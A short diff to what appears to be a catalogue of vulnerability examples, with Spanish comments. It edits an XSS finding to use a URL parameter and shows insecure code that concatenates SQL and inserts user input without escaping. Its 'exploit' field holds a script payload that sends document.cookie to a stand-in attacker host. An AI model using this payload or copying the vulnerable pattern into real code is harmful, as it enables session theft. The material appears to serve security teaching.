@@ -181,7 +181,7 @@ const rows = await db.exec(q)  // el parámetro q se concatena tal cual`,
       file: 'src/controllers/comments.ts',
       line: 24,
       snippet: `res.send(\`
-  <div>\${req.body.comment}</div>  <!-- el comentario se inserta sin escapar -->
+  <div>\${req.query.msg}</div>  <!-- el parámetro de la URL se inserta sin escapar -->
 \`)`,
       exploit: "GET /comentarios?msg=<script>fetch('https://evil.sh?c='+document.cookie)</script> ejecuta JavaScript en el navegador de quien abra el enlace.",
       consequences: 'Robo de cookies de sesión y ejecución de acciones en nombre del usuario (robo de sesión, pagos no autorizados).',
